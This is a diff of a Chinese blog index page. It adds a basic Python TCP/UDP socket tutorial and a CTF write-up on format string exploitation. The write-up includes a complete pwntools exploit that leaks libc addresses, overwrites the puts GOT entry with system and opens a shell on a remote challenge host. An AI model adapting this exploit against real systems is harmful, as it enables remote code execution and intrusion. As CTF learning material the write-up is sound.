@@ -148,6 +148,93 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Python网络编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/10/Python网络编程/">Python网络编程</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/10/Python网络编程/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Python网络编程"><a href="#Python网络编程" class="headerlink" title="Python网络编程"></a>Python网络编程</h3><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a><strong>客户端</strong></h4><h5 id="1-创建一个基于TCP连接的Socket"><a href="#1-创建一个基于TCP连接的Socket" class="headerlink" title="1.创建一个基于TCP连接的Socket"></a><strong>1.创建一个基于TCP连接的Socket</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket  <span class="comment">#导入socket库</span></span><br><span class="line"><span class="comment">#创建一个socket</span></span><br><span class="line"></span><br><span class="line">s  =  socket.socket（socket.AF_INET,socket.SOCK_STREAM）<span class="comment">#AF_INET指定使用IPv4协议，如果要用更先进的IPv6，就指定为AF_INET6。SOCK_STREAM指定使用面向流的TCP协议</span></span><br><span class="line"></span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line"><span class="keyword">print</span>  host</span><br><span class="line"><span class="comment">#设置端口</span></span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line"><span class="comment">#客户端建立连接需要主动，所以是主动connect</span></span><br><span class="line">s.connect((host,port))  <span class="comment">#(host,port)是一个元组turple</span></span><br><span class="line"><span class="comment">#连接成功后发送数据</span></span><br><span class="line">s.send(<span class="string">'Hello,I\'m Client!'</span>)</span><br><span class="line"><span class="comment">#接受服务端发来的数据</span></span><br><span class="line"><span class="keyword">print</span>  s.recv(<span class="number">1024</span>)  <span class="comment">#设置最大值为1024个字节，超出部分放入缓冲区</span></span><br><span class="line"><span class="comment">#关闭连接</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-UDP编程"><a href="#2-UDP编程" class="headerlink" title="2.UDP编程"></a><strong>2.UDP编程</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line"></span><br><span class="line">s  =  socket.socket(socket.AF_INET,socket.SOCK_DGRAM)<span class="comment">#创建Socket时，SOCK_DGRAM指定了这个Socket的类型是UDP</span></span><br><span class="line"></span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line"><span class="comment">#s.sendto需要发送的数据与给谁发</span></span><br><span class="line">s.sendto(<span class="string">b'Client'</span>,(host,port))</span><br><span class="line"><span class="keyword">print</span>  s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a><strong>服务端</strong></h4><h5 id="1-创建一个基于TCP连接的Socket-1"><a href="#1-创建一个基于TCP连接的Socket-1" class="headerlink" title="1.创建一个基于TCP连接的Socket"></a><strong>1.创建一个基于TCP连接的Socket</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line"><span class="keyword">import</span>  thread</span><br><span class="line">s  =  socket.socket(socket.AF_INET,  socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line"><span class="keyword">print</span>  host</span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line"><span class="comment">#服务端被动建立连接，所以需要指定该程序与哪个socket绑定，需要用bind</span></span><br><span class="line"></span><br><span class="line">s.bind((host,port))  <span class="comment">#(host,port)是一个元组turple</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设立最大连接数</span></span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接受一个新连接</span></span><br><span class="line">sock,addr=s.accept()</span><br><span class="line">sock.send(<span class="string">b'Welcome!'</span>)</span><br><span class="line">data  =  sock.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span>  data</span><br><span class="line">sock.send(<span class="string">b'I\'m Server!'</span>)</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
+
+<p>测试服务器的客户端程序如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line">s  =  socket.socket(socket.AF_INET,  socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立连接:</span></span><br><span class="line"></span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line">s.connect((host,  port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收欢迎消息:</span></span><br><span class="line"></span><br><span class="line">print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">s.send(<span class="string">b'I\'m testServer!'</span>)</span><br><span class="line"><span class="keyword">print</span>  s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-UDP编程-1"><a href="#2-UDP编程-1" class="headerlink" title="2.UDP编程"></a><strong>2.UDP编程</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line"></span><br><span class="line">s  =  socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line"><span class="comment">#绑定端口:</span></span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line">s.bind((host,port))</span><br><span class="line"><span class="keyword">print</span>  <span class="string">'Bind UDP on 55555'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不需要建立连接，直接接收数据</span></span><br><span class="line"><span class="comment">#s.recvfrom()拿到发送的信息与谁发的(地址与端口)</span></span><br><span class="line">data,addr=s.recvfrom(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span>  (<span class="string">'Received from %s:%s'</span>  %  addr)</span><br><span class="line"><span class="comment">#s.sendto需要发送的数据与给谁发</span></span><br><span class="line">s.sendto(<span class="string">b'Hello,%s'</span>  %  data,addr)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<p>测试服务器的客户端程序如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line">s  =  socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line"></span><br><span class="line">s.sendto(<span class="string">b'testServer'</span>,(host,port))</span><br><span class="line"><span class="keyword">print</span>  s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/Python网络编程/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Python字符串开头b r u含义" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -268,7 +355,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">pwn,ROP</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ROP</a>
         		</li>
       		
 		</ul>
@@ -361,7 +452,15 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">pwn,ROP,ret2dlresolve</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ROP</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ret2dlresolve</a>
         		</li>
       		
 		</ul>
@@ -401,19 +500,19 @@
 
 
   
-    <article id="post-Python网络编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-格式化字符串漏洞利用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/09/10/Python网络编程/">Python网络编程</a>
+      <a class="article-title" href="/2019/09/10/格式化字符串漏洞利用/">格式化字符串漏洞利用</a>
     </h1>
   
 
         
-        <a href="/2019/09/10/Python网络编程/" class="archive-article-date">
+        <a href="/2019/09/10/格式化字符串漏洞利用/" class="archive-article-date">
   	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
 </a>
         
@@ -421,20 +520,18 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="Python网络编程"><a href="#Python网络编程" class="headerlink" title="Python网络编程"></a>Python网络编程</h3><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a><strong>客户端</strong></h4><h5 id="1-创建一个基于TCP连接的Socket"><a href="#1-创建一个基于TCP连接的Socket" class="headerlink" title="1.创建一个基于TCP连接的Socket"></a><strong>1.创建一个基于TCP连接的Socket</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket  <span class="comment">#导入socket库</span></span><br><span class="line"><span class="comment">#创建一个socket</span></span><br><span class="line"></span><br><span class="line">s  =  socket.socket（socket.AF_INET,socket.SOCK_STREAM）<span class="comment">#AF_INET指定使用IPv4协议，如果要用更先进的IPv6，就指定为AF_INET6。SOCK_STREAM指定使用面向流的TCP协议</span></span><br><span class="line"></span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line"><span class="keyword">print</span>  host</span><br><span class="line"><span class="comment">#设置端口</span></span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line"><span class="comment">#客户端建立连接需要主动，所以是主动connect</span></span><br><span class="line">s.connect((host,port))  <span class="comment">#(host,port)是一个元组turple</span></span><br><span class="line"><span class="comment">#连接成功后发送数据</span></span><br><span class="line">s.send(<span class="string">'Hello,I\'m Client!'</span>)</span><br><span class="line"><span class="comment">#接受服务端发来的数据</span></span><br><span class="line"><span class="keyword">print</span>  s.recv(<span class="number">1024</span>)  <span class="comment">#设置最大值为1024个字节，超出部分放入缓冲区</span></span><br><span class="line"><span class="comment">#关闭连接</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+        <h3 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a><strong>格式化字符串漏洞利用</strong></h3><p>以<strong>实验吧 printf</strong>为例：<br><strong>漏洞利用思路</strong>：</p>
+<ol>
+<li>注意到在get_file中存在格式化字符串漏洞，利用其泄露出真实的puts地址，从而计算得到真实的system地址</li>
+<li>将puts的got表覆盖成真实的system地址，并将其参数布局成 ‘/bin/sh’</li>
+<li>在dir_file功能中调用puts(“/bin/sh”)时，相当于调用了system(“/bin/sh”)<br><img src="/2019/09/10/格式化字符串漏洞利用/19a4a1a3fbdeaebe9be40c9bb7048e88.png" alt><br><img src="/2019/09/10/格式化字符串漏洞利用/79076a875c0be0f6d97d4c473253830b.png" alt><br>使用<strong>objdump</strong>得到想要的信息：<br>拿到<strong>puts的got表地址</strong>：<br><img src="/2019/09/10/格式化字符串漏洞利用/12f365ca9d4c0974c5c199fc01c77ad1.png" alt><br>拿到他们<strong>在libc中的偏移</strong>：<br><img src="/2019/09/10/格式化字符串漏洞利用/3b2274e6c5035e053d8ae71843504655.png" alt><br>找见<strong>可控字段</strong>：<br><img src="/2019/09/10/格式化字符串漏洞利用/3e106ca9b4c77a52be5e124bc8b9a7b2.png" alt></li>
+</ol>
+<p><strong>偏移量</strong>为：(0xd24c-0xd230)/4 = 7<br>利用printf打印出puts的got表中对应的真实的puts地址，使用其计算得到真实的system地址</p>
+<p><strong>计算方法</strong>如下：<br>addr_libc = addr_puts - offset_puts<br>addr_system = addr_libc + offset_system<br>利用%n覆写puts的got表地址，拿到shell</p>
+<p><strong>exp</strong>如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">puts_file</span><span class="params">(io,  name,content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'ftp&gt;'</span>)</span><br><span class="line">    io.sendline(<span class="string">'put'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'upload:'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">get_file</span><span class="params">(io,  name)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'ftp&gt;'</span>)</span><br><span class="line">    io.sendline(<span class="string">'get'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'get:'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">dir_file</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'ftp&gt;'</span>)</span><br><span class="line">    io.sendline(<span class="string">'dir'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'Start!'</span></span><br><span class="line">    fake_username  =  <span class="string">'sysbdmin'</span></span><br><span class="line">    real_username  =  <span class="string">''</span></span><br><span class="line">    <span class="comment">#计算出真实的用户名</span></span><br><span class="line">    <span class="keyword">for</span>  i  <span class="keyword">in</span>  fake_username:</span><br><span class="line">        real_username  +=  chr(ord(i)  -  <span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Name (ftp.hacker.server:Rainism):'</span>)</span><br><span class="line">    io.sendline(real_username)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] real_username : '</span>,real_username</span><br><span class="line">    <span class="comment">#得到puts的got表地址</span></span><br><span class="line">    got_puts  =  <span class="number">0x0804a028</span></span><br><span class="line">    <span class="comment">#得到puts的偏移量</span></span><br><span class="line">    offset_puts  =  <span class="number">0x5fca0</span></span><br><span class="line">    content  =  p32(got_puts)  +  <span class="string">'%7$s...'</span></span><br><span class="line">    <span class="comment">#构造之后system调用的参数("/bin/sh")</span></span><br><span class="line">    name  =  <span class="string">'/sh'</span></span><br><span class="line">    puts_file(io,  name,  content)</span><br><span class="line">    get_file(io,  name)</span><br><span class="line">    <span class="comment">#利用printf的格式化字符串漏洞打印出真实的puts地址</span></span><br><span class="line">    data  =  io.recvuntil(<span class="string">'...'</span>)[<span class="number">0</span>:]</span><br><span class="line">    addr_puts  =  u32(data[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] addr_puts: '</span>,hex(addr_puts)</span><br><span class="line">    <span class="comment">#计算libc的基址</span></span><br><span class="line">    addr_libc  =  addr_puts  -  offset_puts</span><br><span class="line">    offset_system  =  <span class="number">0x3ada0</span></span><br><span class="line">    <span class="comment">#计算system的真实地址</span></span><br><span class="line">    addr_system  =  addr_libc  +  offset_system</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] addr_system: '</span>,hex(addr_system)</span><br><span class="line"></span><br><span class="line">    addr_info  =  <span class="string">''</span></span><br><span class="line">    padding_info  =  <span class="string">''</span></span><br><span class="line">    <span class="comment">#覆盖puts的got表地址</span></span><br><span class="line">    system_addr_buff  =  p32(addr_system)</span><br><span class="line">    begin_index  =  <span class="number">7</span></span><br><span class="line">    offset  =  <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span>  i  <span class="keyword">in</span>  range(<span class="number">4</span>):</span><br><span class="line">        addr_info  +=  p32(got_puts  +  i)</span><br><span class="line">        val  =  ord(system_addr_buff[i])</span><br><span class="line">        count  =  val  -  offset</span><br><span class="line">        <span class="keyword">if</span>  count  &lt;  <span class="number">0</span>  :</span><br><span class="line">            count  +=  <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">        padding_info  +=  <span class="string">'%%%dc'</span>  %  count  +  <span class="string">'%%%d$hhn'</span>  %  (begin_index  +  i)</span><br><span class="line"></span><br><span class="line">        offset  =  val</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] Start Attacking!'</span></span><br><span class="line">    <span class="comment">#与之前创建的文件名组成了system的参数("/bin/sh")</span></span><br><span class="line">    name  =  <span class="string">'/bin'</span></span><br><span class="line">    content  =  addr_info  +  padding_info</span><br><span class="line">    puts_file(io,  name,  content)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] puts_file succeed!'</span></span><br><span class="line">    get_file(io,  name)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] get_file succeed!'</span></span><br><span class="line">    dir_file(io)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] dir_file succeed!'</span></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    io  =  remote(<span class="string">'106.2.25.7'</span>,<span class="number">8001</span>)</span><br><span class="line">    pwn(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__  ==  <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
-<h5 id="2-UDP编程"><a href="#2-UDP编程" class="headerlink" title="2.UDP编程"></a><strong>2.UDP编程</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line"></span><br><span class="line">s  =  socket.socket(socket.AF_INET,socket.SOCK_DGRAM)<span class="comment">#创建Socket时，SOCK_DGRAM指定了这个Socket的类型是UDP</span></span><br><span class="line"></span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line"><span class="comment">#s.sendto需要发送的数据与给谁发</span></span><br><span class="line">s.sendto(<span class="string">b'Client'</span>,(host,port))</span><br><span class="line"><span class="keyword">print</span>  s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
-
-<h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a><strong>服务端</strong></h4><h5 id="1-创建一个基于TCP连接的Socket-1"><a href="#1-创建一个基于TCP连接的Socket-1" class="headerlink" title="1.创建一个基于TCP连接的Socket"></a><strong>1.创建一个基于TCP连接的Socket</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line"><span class="keyword">import</span>  thread</span><br><span class="line">s  =  socket.socket(socket.AF_INET,  socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line"><span class="keyword">print</span>  host</span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line"><span class="comment">#服务端被动建立连接，所以需要指定该程序与哪个socket绑定，需要用bind</span></span><br><span class="line"></span><br><span class="line">s.bind((host,port))  <span class="comment">#(host,port)是一个元组turple</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设立最大连接数</span></span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接受一个新连接</span></span><br><span class="line">sock,addr=s.accept()</span><br><span class="line">sock.send(<span class="string">b'Welcome!'</span>)</span><br><span class="line">data  =  sock.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span>  data</span><br><span class="line">sock.send(<span class="string">b'I\'m Server!'</span>)</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
-
-<p>测试服务器的客户端程序如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line">s  =  socket.socket(socket.AF_INET,  socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立连接:</span></span><br><span class="line"></span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line">s.connect((host,  port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收欢迎消息:</span></span><br><span class="line"></span><br><span class="line">print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">s.send(<span class="string">b'I\'m testServer!'</span>)</span><br><span class="line"><span class="keyword">print</span>  s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
-
